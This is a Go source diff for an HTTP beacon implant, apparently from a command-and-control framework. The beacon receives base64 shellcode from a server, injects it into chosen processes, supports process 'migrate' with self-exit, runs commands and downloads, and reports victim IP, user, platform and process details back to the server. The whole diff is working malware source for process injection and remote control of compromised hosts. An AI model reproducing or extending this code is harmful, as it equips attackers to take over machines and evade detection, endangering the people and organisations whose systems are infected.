@@ -4,7 +4,6 @@ import (
 	"os"
 	"io"
 	"fmt"
-	"time"
 	"bufio"
 	"bytes"
 	"strconv"
@@ -64,8 +63,8 @@ func queryCommandHttp(endpoint string) (resp *http.Response, err error) {
 func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
 	for i := 0; i < len(commResp.Shellcode); i += 2 {
 		shellcode := commResp.Shellcode[i]
-		procId, err := strconv.Atoi(commResp.Shellcode[i+1])
-		fmt.Println(procId)
+		procInfo := strings.Split(commResp.Shellcode[i+1], " ")
+		procId, err := strconv.Atoi(procInfo[1])
 
 		if err != nil {
 			debugFatal(err)
@@ -73,16 +72,35 @@ func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
 		}
 		
 		decodedShellcode, err := b64.StdEncoding.DecodeString(shellcode)
-	
+		
 		if err != nil {
 			debugFatal(err)
 			continue
 		}
 
 		si := ShellcodeInjector {decodedShellcode, procId}
-		go func() {
-			si.inject()
-		}()
+		err = si.inject()
+		
+		var data []byte
+				
+		if procInfo[0] == "migrate" {
+			var msg string
+			if err == nil || err.Error() == "The operation completed successfully." {
+				msg = "Success"
+				defer packet.exitHandler()
+			} else {
+				msg = err.Error()
+			}
+
+			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"migrate",[]byte(msg)})
+		} else {
+			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"inject",[]byte(err.Error())})
+		}
+
+		debugFatal(err)
+	 	encoded := b64.StdEncoding.EncodeToString(data)
+		queryCommandHttp(encoded)
+	
 	}
 
 	for _, file := range commResp.Download {
@@ -104,11 +122,6 @@ func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
 		cmdSplit := strings.Fields(cmd);
 		output := []byte{}
 		
-		if cmdSplit[0] == "migrate" {
-			time.Sleep(10 * time.Second)
-			packet.exitHandler()
-		}
-
 		if cmdSplit[0] == "exit" || cmdSplit[0] == "quit" {
 			packet.exitHandler()
 		}
